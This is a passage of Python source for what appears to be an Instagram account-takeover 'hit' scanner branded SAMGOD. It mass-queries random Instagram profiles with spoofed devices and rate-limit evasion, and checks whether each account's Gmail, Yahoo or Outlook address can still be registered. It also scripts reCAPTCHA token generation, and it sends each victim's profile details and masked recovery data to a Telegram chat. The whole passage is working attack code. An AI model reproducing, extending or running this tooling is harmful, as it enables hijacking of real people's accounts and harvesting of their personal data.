            response = requests.post(
                f"{_M1_GOOGLE_URL}/_/signup/validatepersonaldetails",
                cookies=cookies, headers=headers, data=data, timeout=15
            )
            if '",null,"' in response.text:
                tl = response.text.split('",null,"')[1].split('"')[0]
            host = response.cookies.get("__Host-GAPS", host)
            with open(_M1_TOKEN_FILE, "w") as f:
                f.write(f"{tl}//{host}\n")
            return True
        except Exception:
            continue
    try:
        headers2 = {
            "accept": "*/*",
            "accept-language": "en",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "origin": "https://accounts.google.com",
            "referer": "https://accounts.google.com/",
            "user-agent": random.choice(_M1_USER_AGENTS),
            "x-goog-ext-278367001-jspb": '["GlifWebSignIn"]',
            "x-same-domain": "1",
        }
        params2 = {"rpcids": "NHJMOd", "source-path": "/lifecycle/steps/signup/username", "hl": "en"}
        fake_em = "".join(random.choices("abcdefghijklmnopqrstuvwxyz1234567890.", k=random.randint(16, 26)))
        data2   = f"f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{fake_em}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D"
        resp2   = requests.post(
            "https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute",
            params=params2, headers=headers2, data=data2, timeout=15
        )
        tl_match = re.search(r'"TL:([^"]+)"', resp2.text)
        if tl_match:
            tl   = tl_match.group(1)
            host = "".join(random.choices(alphabet, k=random.randint(15, 30)))
            with open(_M1_TOKEN_FILE, "w") as f:
                f.write(f"{tl}//{host}\n")
            return True
    except Exception:
        pass
    return False


def _m1_get_tl_background():
    """Background: refresh TL every 120 s via validatepersonaldetails→validatebasicinfo, write to google.txt."""
    while True:
        try:
            url1    = "https://accounts.google.com/_/signup/validatepersonaldetails"
            params1 = {"hl": "en-GB", "_reqid": "46000", "rt": "j"}
            payload1 = {
                "continue":        "https://accounts.google.com/ManageAccount?nc=1",
                "f.req":           '[\"AEThLlw3_SjR2r7ZvRrESUg3K4e9eBWmlOC4rULBmw9UAcZVy1db7ezAlKKPXcOeac71VE9Ducrl\",null,null,null,null,0,0,\"aesowns\",\"aesowns\",null,0,null,1,[],1]',
                "azt":             "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
                "cookiesDisabled": "false",
                "deviceinfo":      '[null,null,null,null,null,"IN",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,1,null,0,1,"",null,null,2,2,2]',
                "gmscoreversion":  "null",
                "flowName":        "GlifWebSignIn",
                "checkConnection": "youtube:301",
                "checkedDomains":  "youtube",
                "pstMsg":          "1",
                "":                "",
            }
            headers1 = {
                "User-Agent":           "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                "x-same-domain":        "1",
                "google-accounts-xsrf": "1",
                "origin":               "https://accounts.google.com",
                "referer":              "https://accounts.google.com/createaccount?flowName=GlifWebSignIn&flowEntry=ServiceLogin",
                "accept-language":      "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                "Cookie":               "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN",
            }
            resp1 = _M1_TL_SESSION.post(url1, params=params1, data=payload1, headers=headers1, timeout=20)
            tl_1  = json.loads(resp1.text[5:])[0][1][2]

            url2    = "https://accounts.google.com/_/signup/validatebasicinfo"
            params2 = {"hl": "en-GB", "TL": tl_1, "_reqid": "346000", "rt": "j"}
            payload2 = {
                "continue":        "https://accounts.google.com/ManageAccount?nc=1",
                "f.req":           f'["TL:{tl_1}",2015,4,15,2,null,null,0,null,null,0,0]',
                "azt":             "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
                "cookiesDisabled": "false",
                "deviceinfo":      '[null,null,null,null,null,"IN",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,1,null,0,1,"",null,null,2,2,2]',
                "gmscoreversion":  "null",
                "flowName":        "GlifWebSignIn",
                "checkConnection": "youtube:301",
                "checkedDomains":  "youtube",
                "pstMsg":          "1",
                "":                "",
            }
            headers1["referer"] = f"https://accounts.google.com/signup/v2/birthdaygender?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL={tl_1}"
            resp2 = _M1_TL_SESSION.post(url2, params=params2, data=payload2, headers=headers1, timeout=20)
            tl    = json.loads(resp2.text[5:])[0][0][4].split("TL:")[1]
            with open("google.txt", "w") as w:
                w.write(tl)
        except Exception:
            pass
        time.sleep(120)


def _m1_gtokens_background():
    time.sleep(60)
    while True:
        try:
            _m1_gtokens()
        except Exception:
            pass
        time.sleep(90)


# ── Gmail availability check ──

def _m1_cyahoo(username, domain, user, token, chat_id):
    """Check Yahoo / AOL username availability (both use the same Verizon-Oath backend)."""
    global _m1_bad_email, _m1_taken
    try:
        if "@" in username:
            username = username.split("@")[0]
        try:
            resp = requests.get(
                "https://api.login.yahoo.com/v4/loginserver/yid/check",
                params={"yid": username, "specId": "yidregsimplified"},
                headers={"User-Agent": random.choice(_M1_WEB_USER_AGENTS)},
                timeout=8,
            )
            data = resp.json()
            errors = data.get("errors", [])
            taken_codes = {"IDENTIFIER_EXISTS", "YID_UNAVAILABLE", "TAKEN"}
            if any(e.get("error") in taken_codes for e in errors):
                _m1_taken += 1
                return
            _m1_save_hit(username, domain, user, token, chat_id)
        except Exception:
            _m1_bad_email += 1
    except Exception:
        _m1_bad_email += 1


def _m1_cmicrosoft(username, domain, user, token, chat_id):
    """Check Hotmail / Outlook username availability via Microsoft's credential-type API."""
    global _m1_bad_email, _m1_taken
    try:
        if "@" in username:
            username = username.split("@")[0]
        email = f"{username}@{domain}"
        try:
            resp = requests.post(
                "https://login.microsoftonline.com/common/GetCredentialType",
                json={"Username": email, "isOtherIdpSupported": True},
                headers={
                    "User-Agent": random.choice(_M1_WEB_USER_AGENTS),
                    "Content-Type": "application/json",
                },
                timeout=8,
            )
            data = resp.json()
            exists_code = data.get("IfExistsResult", -1)
            if exists_code == 0:
                _m1_save_hit(username, domain, user, token, chat_id)
                return
            elif exists_code in (1, 4, 6):
                _m1_taken += 1
            else:
                _m1_bad_email += 1
        except Exception:
            _m1_bad_email += 1
    except Exception:
        _m1_bad_email += 1


def _m1_cgmail(username, user, token, chat_id, loc_session):
    global _m1_bad_email, _m1_taken
    try:
        if "@" in username:
            username = username.split("@")[0]

        # ── Primary: tokens.txt (gtokens flow) ──────────────────────────────
        try:
            with open(_M1_TOKEN_FILE, "r") as f:
                line = f.read().splitlines()[0]
            tl, host = line.split("//")
            cookies = {"__Host-GAPS": host}
            headers = {
                "authority": "accounts.google.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": _M1_FORM_TYPE,
                "google-accounts-xsrf": "1",
                "origin": _M1_GOOGLE_URL,
                "referer": f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
                "user-agent": random.choice(_M1_USER_AGENTS),
            }
            data = (
                f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{username}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&"
            )
            resp = loc_session.post(
                f"{_M1_GOOGLE_URL}/_/signup/usernameavailability",
                params={"TL": tl}, cookies=cookies, headers=headers, data=data, timeout=12
            )
            if '"gf.uar",1' in resp.text:
                _m1_save_hit(username, "gmail.com", user, token, chat_id)
                return
        except Exception:
            pass

        # ── Secondary: google.txt (get_tl_background flow) ──────────────────
        try:
            with open("google.txt", "r") as ys:
                tl = ys.read().strip()
            url = "https://accounts.google.com/_/signup/usernameavailability"
            params = {"hl": "en-GB", "TL": tl, "_reqid": "446000", "rt": "j"}
            payload = {
                "continue":        "https://accounts.google.com/ManageAccount?nc=1",
                "f.req":           f'["TL:{tl}","{username}",0,0,1,null,1,2464]',
                "azt":             "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
                "cookiesDisabled": "false",
                "deviceinfo":      '[null,null,null,null,null,"IN",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,1,null,0,1,"",null,null,2,2,2]',
                "gmscoreversion":  "null",
                "flowName":        "GlifWebSignIn",
                "checkConnection": "youtube:301",
                "checkedDomains":  "youtube",
                "pstMsg":          "1",
                "":                "",
            }
            headers2 = {
                "User-Agent":           "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                "x-same-domain":        "1",
                "google-accounts-xsrf": "1",
                "origin":               "https://accounts.google.com",
                "referer":              f"https://accounts.google.com/signup/v2/createusername?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL={tl}",
                "accept-language":      "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                "Cookie":               "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN",
            }
            response = _M1_TL_SESSION.post(url, params=params, data=payload, headers=headers2, timeout=20)
            if '"gf.uar",1' in response.text:
                _m1_save_hit(username, "gmail.com", user, token, chat_id)
                return
            else:
                _m1_taken += 1
        except Exception:
            _m1_taken += 1

        _m1_bad_email += 1
    except Exception:
        _m1_bad_email += 1


# ── Country flag helper ──

def _m1_get_country_flag(country_name):
    if not country_name or country_name in ["-", "Paylasilmadi", "None", ""]:
        return ""
    flags = {
        "Turkiye": "\U0001f1f9\U0001f1f7", "Irak": "\U0001f1ee\U0001f1f6",
        "Fransa": "\U0001f1eb\U0001f1f7", "Endonezya": "\U0001f1ee\U0001f1e9",
        "Arjantin": "\U0001f1e6\U0001f1f7", "Almanya": "\U0001f1e9\U0001f1ea",
        "Amerika Birlesik Devletleri": "\U0001f1fa\U0001f1f8",
        "Birlesik Krallik": "\U0001f1ec\U0001f1e7",
        "Ingiltere": "\U0001f1ec\U0001f1e7", "Italya": "\U0001f1ee\U0001f1f9",
        "Ispanya": "\U0001f1ea\U0001f1f8", "Hollanda": "\U0001f1f3\U0001f1f1",
        "Avusturya": "\U0001f1e6\U0001f1f9", "Norveç": "\U0001f1f3\U0001f1f4",
        "Danimarka": "\U0001f1e9\U0001f1f0", "Finlandiya": "\U0001f1eb\U0001f1ee",
        "Polonya": "\U0001f1f5\U0001f1f1", "Rusya": "\U0001f1f7\U0001f1fa",
        "Ukrayna": "\U0001f1fa\U0001f1e6", "Brezilya": "\U0001f1e7\U0001f1f7",
        "Meksika": "\U0001f1f2\U0001f1fd", "Hindistan": "\U0001f1ee\U0001f1f3",
        "Japonya": "\U0001f1ef\U0001f1f5", "Guney Kore": "\U0001f1f0\U0001f1f7",
        "Avustralya": "\U0001f1e6\U0001f1fa", "Kanada": "\U0001f1e8\U0001f1e6",
        "Misir": "\U0001f1ea\U0001f1ec", "Suudi Arabistan": "\U0001f1f8\U0001f1e6",
        "Birlesik Arap Emirlikleri": "\U0001f1e6\U0001f1ea",
        "Katar": "\U0001f1f6\U0001f1e6", "Kuveyt": "\U0001f1f0\U0001f1fc",
        "Yunanistan": "\U0001f1ec\U0001f1f7", "Portekiz": "\U0001f1f5\U0001f1f9",
        "Romanya": "\U0001f1f7\U0001f1f4", "Bulgaristan": "\U0001f1e7\U0001f1ec",
        "Macaristan": "\U0001f1ed\U0001f1fa", "Malezya": "\U0001f1f2\U0001f1fe",
        "Singapur": "\U0001f1f8\U0001f1ec", "Tayland": "\U0001f1f9\U0001f1ed",
        "Vietnam": "\U0001f1fb\U0001f1f3", "Filipinler": "\U0001f1f5\U0001f1ed",
        "Pakistan": "\U0001f1f5\U0001f1f0", "Nijerya": "\U0001f1f3\U0001f1ec",
        "Kenya": "\U0001f1f0\U0001f1ea", "Fas": "\U0001f1f2\U0001f1e6",
        "Tunus": "\U0001f1f9\U0001f1f3", "Cezayir": "\U0001f1e9\U0001f1ff",
        "Libya": "\U0001f1f1\U0001f1fe", "Sudan": "\U0001f1f8\U0001f1e9",
        "Gana": "\U0001f1ec\U0001f1ed", "Suriye": "\U0001f1f8\U0001f1fe",
        "Yemen": "\U0001f1fe\U0001f1ea", "Filistin": "\U0001f1f5\U0001f1f8",
        "Afganistan": "\U0001f1e6\U0001f1eb", "Sri Lanka": "\U0001f1f1\U0001f1f0",
        "Nepal": "\U0001f1f3\U0001f1f5", "Myanmar": "\U0001f1f2\U0001f1f2",
        "Yeni Zelanda": "\U0001f1f3\U0001f1ff",
        "Bosna Hersek": "\U0001f1e7\U0001f1e6", "Moldova": "\U0001f1f2\U0001f1e9",
        "Belarus": "\U0001f1e7\U0001f1fe", "Litvanya": "\U0001f1f1\U0001f1f9",
        "Letonya": "\U0001f1f1\U0001f1fb", "Ermenistan": "\U0001f1e6\U0001f1f2",
        "Jamaika": "\U0001f1ef\U0001f1f2",
    }
    if country_name in flags:
        return flags[country_name]
    country_lower = country_name.lower()
    for key in flags:
        if key.lower() in country_lower or country_lower in key.lower():
            return flags[key]
    return ""


# ── Hit saver (SAMGOD format) ──

def _m1_save_hit(username, domain, user, token, chat_id):
    global _m1_hits, _m1_total, _m1_found_emails

    user_id    = user.get("pk", "Unknown")
    followers  = user.get("follower_count", 0) or 0
    followings = user.get("following_count", 0) or 0
    posts      = user.get("media_count", 0) or 0
    name       = user.get("full_name", "None") or "None"
    bio        = (user.get("biography", "") or "")[:50]
    business   = user.get("is_business", False)
    year       = str(gdate(user_id))
    email_str  = f"{username}@{domain}"
    meta       = "True" if posts > 2 else "False"

    # Run the three slow lookups in parallel instead of serially
    with ThreadPoolExecutor(max_workers=3) as _hit_ex:
        _f_reset  = _hit_ex.submit(_m1_rest_v1, username)
        _f_masked = _hit_ex.submit(_m1_get_masked, username)
        _f_about  = _hit_ex.submit(_m1_get_about_account, user_id, username)
        reset_mask = _f_reset.result()
        masked     = _f_masked.result()
        _about_raw = _f_about.result()

    about          = _about_raw
    join_date      = about.get("join_date") or year
    country_name   = about.get("country") or "-"
    country_flag   = _m1_get_country_flag(country_name)
    country_display = f"{country_name} {country_flag}".strip() if country_flag else country_name
    former_usernames = ", ".join(about.get("former_usernames", [])) or "-"

    with _m1_hit_lock:
        _m1_hits  += 1
        _m1_total += 1
        hit_num    = _m1_hits

    masked_line = f"[ ✰ ] Masked Email ➺ {masked}\n" if masked else ""

    box = (
        "\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "ᡣ 𐭩 SAMGOD 🔱 SEND A HIT ᡣ 𐭩\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"❍ Business : {business}\n"
        f"❍ Meta     : {meta}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "≿━━━━━━༺ Tool By SAMGOD 🔱 ༻━━━━━━≾\n"
        f"[ ✰ ] Hit #        ➺ {hit_num}\n"
        f"[ ✰ ] Name         ➺ {name}\n"
        f"[ ✰ ] Username     ➺ @{username}\n"
        f"[ ✰ ] Domain       ➺ {domain}\n"
        f"[ ✰ ] Followers    ➺ {followers}\n"
        f"[ ✰ ] Following    ➺ {followings}\n"
        f"[ ✰ ] Posts        ➺ {posts}\n"
        f"[ ✰ ] Bio          ➺ {bio}\n"
        f"[ ✰ ] Email        ➺ {email_str}\n"
        f"[ ✰ ] Attached     ➺ {reset_mask}\n"
        f"{masked_line}"
        f"[ ✰ ] Year         ➺ {year}\n"
        f"[ ✰ ] Join Date    ➺ {join_date}\n"
        f"[ ✰ ] Country      ➺ {country_display}\n"
        f"[ ✰ ] Former Users ➺ {former_usernames}\n"
        f"[ ✰ ] Portfolio    ➺ https://instagram.com/{username}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "     Promotion: SAMGOD 🔱\n"
    )

    with _m1_found_lock:
        if email_str not in _m1_found_emails:
            _m1_found_emails.append(email_str)

    _save_hit_to_file(box)
    _queue_telegram(token, chat_id, box)

    with _web_lock:
        _web_state["hits"]  = _m1_hits
        _web_state["total"] = _m1_total


# ── Core scanner ──

def _m1_cinstagram(username, user, token, chat_id, loc_session):
    global _m1_good_insta, _m1_bad_insta

    email = f"{username}@gmail.com"
    if _m1_lookup_instagram(email):
        _m1_good_insta += 1
        # ── hi2.in gate ──────────────────────────────────────────────────────
        # Before spending time on the Gmail check, verify the hi2.in inbox for
        # this username is still free. If someone already registered their
        # Instagram account with username@hi2.in, that inbox is claimed — skip.
        if _m1_hi2_is_taken(username):
            _m1_bad_insta += 1
            return
        # ─────────────────────────────────────────────────────────────────────
        _m1_cgmail(username, user, token, chat_id, requests.Session())
    else:
        _m1_bad_insta += 1


def _m1_sinsta(min_id, max_id, token, chat_id, min_followers=0, stop_event=None):
    local_session = _register_session(requests.Session())
    _BRANDS = ["SAMSUNG","HUAWEI","LGE/lge","HTC","ASUS","ZTE","ONEPLUS","XIAOMI","OPPO","VIVO","SONY","REALME"]
    _VERS   = ["23/6.0","24/7.0","25/7.1.1","26/8.0","27/8.1","28/9.0"]
    _CHARS  = "azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890"
    consecutive_429 = 0   # adaptive backoff counter
    req_count       = 0   # session recycle counter
    _SESSION_RECYCLE = 150  # recycle session every N requests to shed rate-limit state
    while not (stop_event and stop_event.is_set()):
        try:
            # Recycle session periodically so rate-limit cookies don't accumulate
            req_count += 1
            if req_count % _SESSION_RECYCLE == 0:
                try:
                    local_session.close()
                except Exception:
                    pass
                local_session = _register_session(requests.Session())

            user_id    = random.randrange(min_id, max_id)
            rnd        = str(random.randint(2500000000, 21254029834))
            user_agent = (
                "Instagram 311.0.0.32.118 Android ("
                + random.choice(_VERS)
                + "; " + str(random.randint(100, 1300)) + "dpi; "
                + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; "
                + random.choice(_BRANDS)
                + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986" + str(random.randint(111, 999)) + ")"
            )
            lsd = "".join(random.choices(_CHARS, k=16))
            headers = {
                "accept": "*/*",
                "accept-language": "en,en-US;q=0.9",
                "content-type": "application/x-www-form-urlencoded",
                "dnt": "1",
                "origin": "https://www.instagram.com",
                "priority": "u=1, i",
                "referer": "https://www.instagram.com/cristiano/following/",
                "user-agent": user_agent,
                "x-fb-friendly-name": "PolarisProfilePageContentQuery",
                "x-fb-lsd": lsd,
            }
            data = {
                "lsd": lsd,
                "fb_api_caller_class": "RelayModern",
                "fb_api_req_friendly_name": "PolarisProfilePageContentQuery",
                "variables": (
                    '{"enable_integrity_filters":true,"id":"' + str(user_id) +
                    '","__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider":true,'
                    '"__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider":false,'
                    '"__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider":false,'
                    '"__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider":false}'
                ),
                "server_timestamps": "true",
                "doc_id": "26672929172408668",
            }
            global _m1_scanned
            _m1_scanned += 1
            _web_state["scanned"] = _m1_scanned

            if stop_event and stop_event.is_set():
                break

            resp = local_session.post(_M1_INSTA_GRAPHQL, headers=headers, data=data, timeout=2)
            if resp.status_code == 429:
                # Exponential backoff: 0.5s, 1s, 2s, 4s … cap at 8s
                consecutive_429 += 1
                backoff = min(0.5 * (2 ** (consecutive_429 - 1)), 8.0)
                time.sleep(backoff)
                # Recycle session immediately when heavily rate-limited
                if consecutive_429 >= 3:
                    try:
                        local_session.close()
                    except Exception:
                        pass
                    local_session = _register_session(requests.Session())
                    req_count = 0
                continue
            if resp.status_code != 200:
                continue

            consecutive_429 = 0  # reset backoff on any successful response

            user = resp.json().get("data", {}).get("user")
            if user and user.get("username"):
                followers = user.get("follower_count", 0)
                if min_followers > 0 and followers < min_followers:
                    continue
                username = user["username"]
                lp = _m1_lookup_pool
                if lp is not None:
                    lp.submit(_m1_cinstagram, username, user, token, chat_id, requests.Session())
                else:
                    _m1_cinstagram(username, user, token, chat_id, local_session)

            # Jittered sleep — avoids synchronized bursts from 500 workers
            time.sleep(random.uniform(0.03, 0.08))
        except Exception:
            time.sleep(random.uniform(0.1, 0.3))
            continue


# ══════════════════════════════════════════════════════════
#  WEB ENTRY POINT  (called by app.py)
# ══════════════════════════════════════════════════════════

def run_method1_web(token, chat_id, year_choice, min_followers, stop_event):
    global _m1_hits, _m1_bad_insta, _m1_bad_email, _m1_good_insta
    global _m1_total, _m1_taken, _m1_limit, _m1_found_emails, _m1_scanned

    _m1_hits = _m1_bad_insta = _m1_bad_email = _m1_good_insta = 0
    _m1_total = _m1_taken = _m1_limit = _m1_scanned = 0
    _m1_found_emails = []

    _write_session_separator(1)
    _web_state.update({
        "running": True, "method": "1",
        "hits": 0, "good": 0, "bad_insta": 0, "bad_email": 0,
        "taken": 0, "limit": 0, "total": 0, "verified": 0,
        "recent_hits": [], "tg_status": "", "tg_error": "",
    })

    _m1_next_about_session()
    _m1_about_refresh_tokens(_m1_ABOUT_COOKIE_STR)
    Thread(target=_m1_about_token_refresher, daemon=True).start()
    Thread(target=_m1_gtokens_background,    daemon=True).start()
    Thread(target=_m1_get_tl_background,     daemon=True).start()

    _m1_gtokens()

    NUM_SCANNERS = int(os.environ.get('M1_SCANNER_WORKERS', 500))
    NUM_LOOKUP   = int(os.environ.get('M1_LOOKUP_WORKERS', 600))
    global _m1_pool, _m1_lookup_pool
    try:
        lookup_pool     = ThreadPoolExecutor(max_workers=NUM_LOOKUP)
        scanner_pool    = ThreadPoolExecutor(max_workers=NUM_SCANNERS)
        _m1_lookup_pool = lookup_pool
        _m1_pool        = scanner_pool

        def _worker_range():
            """Each worker gets its own random year range (or fixed if user chose one)."""
            if year_choice is not None:
                return get_year_range(year_choice)
            r = random.choice(WORKING_RANGES)
            return r[0], r[1]

        futures = [
            scanner_pool.submit(_m1_sinsta, *_worker_range(), token, chat_id, min_followers, stop_event)
            for _ in range(NUM_SCANNERS)
        ]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception:
                pass
    finally:
        _m1_pool        = None
        _m1_lookup_pool = None
        _web_state["running"] = False



# ══════════════════════════════════════════════════════════════════════════════
#  HI2.IN AVAILABILITY CHECK  (shared by M2 and M3)
# ══════════════════════════════════════════════════════════════════════════════
#
#  Flow (from hi2.in HAR / invisible reCAPTCHA v2):
#    1. GET /recaptcha/api2/anchor  →  challenge token
#    2. POST /recaptcha/api2/reload →  final reCAPTCHA response token
#    3. POST https://hi2.in/api/custom  →  200 {"email":"prefix@domain","hash":…}
#       • 200 with matching email  = inbox is available on hi2.in  ✓
#       • anything else            = not available / blocked        ✗

_HI2_SITEKEY  = '6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct'
_HI2_CO       = base64.urlsafe_b64encode(b'https://hi2.in:443').decode().rstrip('=')
_HI2_VER_CACHE: dict = {'v': None, 'ts': 0.0}
_HI2_VER_LOCK = Lock()
_HI2_UA       = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                 'AppleWebKit/537.36 (KHTML, like Gecko) '
                 'Chrome/120.0.0.0 Safari/537.36')


def _hi2_get_version() -> str:
    """Return the current reCAPTCHA JS version (cached 1 h)."""
    with _HI2_VER_LOCK:
        if _HI2_VER_CACHE['v'] and time.time() - _HI2_VER_CACHE['ts'] < 3600:
            return _HI2_VER_CACHE['v']
    try:
        r = requests.get(
            'https://www.google.com/recaptcha/api.js',
            params={'render': _HI2_SITEKEY},
            headers={'User-Agent': _HI2_UA},
            timeout=8,
        )
        m = re.search(r'/releases/([A-Za-z0-9_\-]+)/', r.text)
        if m:
            with _HI2_VER_LOCK:
                _HI2_VER_CACHE['v']  = m.group(1)
                _HI2_VER_CACHE['ts'] = time.time()
            return m.group(1)
    except Exception:
        pass
    return 'rAqPVhe2JMK6mSJKi8r_vw'          # safe fallback


def _hi2_get_recaptcha_token() -> str | None:
    """Generate a fresh invisible reCAPTCHA v2 token for hi2.in."""
    version = _hi2_get_version()
    cb      = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

    s = requests.Session()
    s.headers.update({'User-Agent': _HI2_UA, 'Accept-Language': 'en-US,en;q=0.9'})

    # ── Step 1: anchor ────────────────────────────────────────────────────────
    anchor_url = (
        f'https://www.google.com/recaptcha/api2/anchor'
        f'?ar=1&k={_HI2_SITEKEY}&co={_HI2_CO}'
        f'&hl=en&v={version}&size=invisible&cb={cb}'
    )
    try:
        r1 = s.get(anchor_url, timeout=8)
    except Exception:
        return None

    challenge = None
    for pat in (r'"rresp","([^"]+)"',
                r'id="recaptcha-token" value="([^"]+)"'):
        m = re.search(pat, r1.text)
        if m:
            challenge = m.group(1)
            break
    if not challenge:
        return None

    # ── Step 2: reload ────────────────────────────────────────────────────────
    reload_url = f'https://www.google.com/recaptcha/api2/reload?k={_HI2_SITEKEY}'
    payload    = (
        f'v={version}&reason=q&c={urllib.parse.quote(challenge)}'
        f'&k={_HI2_SITEKEY}&co={_HI2_CO}&hl=en&size=invisible'
        f'&chr=%5B89%2C64%2C27%5D&vh=13599012192&bg=!GgA4oQEAABkEBQAAAA'
    )
    try:
        r2 = s.post(
            reload_url, data=payload,
            headers={'Content-Type': 'application/x-www-form-urlencoded',
                     'Referer': anchor_url},
            timeout=8,
        )
    except Exception:
        return None

    for pat in (r'"rresp","([^"]+)"', r'\["rresp","([^"]+)"'):
        m = re.search(pat, r2.text)
        if m:
            return m.group(1)
    return None


def _hi2_check_available(username: str, domain: str = 'hi2.in') -> bool:
    """Return True if username@domain is available on hi2.in, False if not.

    Uses POST /api/custom (as seen in the hi2.in website HAR):
      • 200 with email == username@domain  →  available  →  save hit
      • 200 with different domain          →  unavailable (domain not assigned)
      • 400 / 429 / error                 →  unavailable
      • network failure                   →  True  (don't block on outage)
    """
    token = _hi2_get_recaptcha_token()
    if not token:
        return True          # can't verify → don't drop the hit

    try:
        r = requests.post(
            'https://hi2.in/api/custom',
            data={'domain': domain, 'prefix': username, 'recaptcha': token},
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin':   'https://hi2.in',
                'Referer':  'https://hi2.in/',
                'User-Agent': _HI2_UA,
            },
            timeout=10,
        )
        if r.status_code == 200:
            data  = r.json()
            email = data.get('email', '').lower()
            return email == f'{username}@{domain}'.lower()
        # 429 rate-limit or any other error → not available
        return False
    except Exception:
        return True          # network error → don't block


# ══════════════════════════════════════════════════════════════════════════════
#  METHOD 2  —  HI2 ALT
# ══════════════════════════════════════════════════════════════════════════════

_m2_hits         = 0
_m2_good_insta   = 0
_m2_bad_insta    = 0
_m2_bad_email    = 0
_m2_taken        = 0
_m2_limit        = 0
_m2_total        = 0
_m2_scanned      = 0
_m2_found_emails: list = []
_m2_found_lock   = Lock()
_m2_hit_lock     = Lock()
_m2_pool:        ThreadPoolExecutor = None
_m1_pool:        ThreadPoolExecutor = None

# ── Instagram email check — V1 (check_email) then V2 (bloks) fallback ─────────

def _m2_generate_ua():
    devices = [
        ("samsung", "SM-G973F", "beyond1", "exynos9820"),
        ("samsung", "SM-A536B", "a53x",    "exynos1280"),
        ("Google",  "Pixel 7",  "panther", "gs201"),
        ("Xiaomi",  "M2102J20SG","ares",   "mt6893"),
        ("OnePlus", "ONEPLUS A6003","OnePlus6","sdm845"),
    ]
    brand, model, device, board = random.choice(devices)
    android_ver = random.choice(["11", "12", "13", "14"])
    api_level   = {"11": "30", "12": "31", "13": "33", "14": "34"}[android_ver]
    dpi         = random.choice(["420", "440", "450", "480"])
    res         = random.choice(["1080x2280", "1080x2400", "1440x3088"])
    ig_ver      = f"{random.randint(280, 340)}.0.0.{random.randint(10, 40)}.{random.randint(80, 150)}"
    rnd         = random.randint(300000000, 400000000)
    return (f"Instagram {ig_ver} Android ({api_level}/{android_ver}; {dpi}dpi; {res}; "
            f"{brand}; {model}; {device}; {board}; en_US; {rnd})")


def _m2_check_v1(email, client):
    """Fast path: check_email endpoint — returns 'registered', 'not_registered', or 'check_v2'."""
    try:
        resp = client.post(
            "https://i.instagram.com/api/v1/users/check_email/",
            data=f"email={email}",
            headers={
                'User-Agent': _m2_generate_ua(),
                'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
                'x-ig-app-id': "567067343352427",
                'accept-language': "en-IN, en-US",
            }
        )
        if 'email_is_taken' in resp.text:
            return 'registered'
        if 'available' in resp.text.lower() or '"valid"' in resp.text:
            return 'not_registered'
        return 'check_v2'
    except Exception:
        return 'check_v2'


def _m2_check_v2(email, client):
    """Fallback: bloks CAA search — email appears in response only when found."""
    android = "android-" + secrets.token_hex(8)
    device  = str(uuid.uuid4())
    family  = str(uuid.uuid4())
    url     = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
    payload = {
        'params': (
            '{"client_input_params":{"search_query":"' + email +
            '","was_headers_prefill_available":0,"was_headers_prefill_used":0,'
            '"text_input_id":"akyuf0:61","accounts_list":[],"fetched_email_list":[],'
